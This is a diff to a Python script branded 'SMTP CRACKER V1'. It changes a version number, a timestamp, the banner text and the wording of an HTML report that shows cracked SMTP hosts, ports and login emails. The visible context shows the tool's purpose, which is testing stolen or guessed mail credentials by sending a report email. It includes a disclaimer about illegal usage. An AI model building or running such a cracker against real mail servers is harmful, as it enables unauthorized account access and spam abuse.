@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 #Coded By mousaanassar04
 #Tool Finished In : 01:22 08/06/2022
+#Tool update In : 1:19 09/06/2022
 import os,socket,threading,base64,datetime,sys,ssl,imaplib,time,re,uuid
 try:
   if os.name=='nt':
@@ -351,7 +352,7 @@ class consumer(threading.Thread):
 			headers+='To: '+email+'\r\n'
 			headers+='Reply-To: '+email+'\r\n'
 			headers+='Subject: SMTP Cracker User-ID Num: ['+randomString+']\r\n'
-			headers+='MIME-Version: 1.0\r\n'
+			headers+='MIME-Version: 1.1\r\n'
 			headers+='Content-Transfer-encoding: 8bit\r\n'
 			headers+="Content-type: text/html; charset=utf-8\r\n";
 			headers+='Return-Path: %s\r\n'%user
@@ -369,7 +370,7 @@ class consumer(threading.Thread):
 		<h1>[ -> ]Simple-SMTP-CHECKER V1 [ <- ]</h1> <br>
 		<font color="#f16f6f"><h1>[ M ]Developped by mousaanassar04 [ M ]</h1></font><br><br><br>
 		<font size="6" color="red">: WARNING : <br><font color="red" size="6" >I don't accept any responsibility for any illegal usage.. </font><br><br>
-		<font size="6" color="green"> your luckly </font>
+		<font size="6" color="green"> you are luckly </font><br><br>
         <font color="black" size="5" ><font color="red">Host :</font> '''+host+''' </font><br><br>
 		<font color="black" size="5" ><font color="red">Port :</font> '''+port+'''<br><br></font>
 		<font color="black" size="5" ><font color="red">Email :</font> '''+user+'''<br><br></font>
@@ -419,13 +420,13 @@ print('''
 (.-./`-'\.-.)  \033[93m$$    $$/ $$ | $/  $$ |   $$ |   $$ |       \033[0;96m(.-./`-'\.-.) 
  `-'     `-'    \033[93m$$$$$$/  $$/      $$/    $$/    $$/         \033[0;96m`-'     `-'
                \033[91m[\033[92m+\033[91m]\033[1m(C)opyright > github.com/mousaanassar04\033[91m [\033[92m+\033[91m]
-              \033[91m[\033[92m+\033[91m]\033[95m SMTP CRACKER V1 DEVEL BY mousaanassar04 \033[91m[\033[92m+\033[91m]''')
+              \033[91m[\033[92m+\033[91m]\033[95m SMTP CRACKER V1 BY mousaanassar04 \033[91m[\033[92m+\033[91m]''')
 ms0g ="\n\033[93mChecking\033[0;96m Your\033[91m Version (%s)\033[92m "%vers
 for i in ms0g:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
-if vers=='1':
+if vers=='1.1':
   print('{>} Good You have last version \n')
 else:
  print("\033[91mThere is New Version available !! Do you Want To Update Your tool ? \033[00m")
